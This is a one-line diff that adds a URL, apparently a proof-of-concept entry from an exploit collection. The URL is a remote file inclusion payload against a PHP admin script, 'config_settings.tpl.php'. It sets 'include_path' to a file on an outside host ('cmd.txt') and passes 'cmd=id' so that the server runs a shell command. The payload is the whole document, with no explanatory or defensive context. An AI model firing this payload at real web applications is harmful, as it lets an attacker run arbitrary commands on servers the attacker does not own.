@@ -1,0 +1,1 @@
+http://www.example.com/admin/config_settings.tpl.php?include_path=http://www.example.com/cmd.txt?&amp;cmd=id
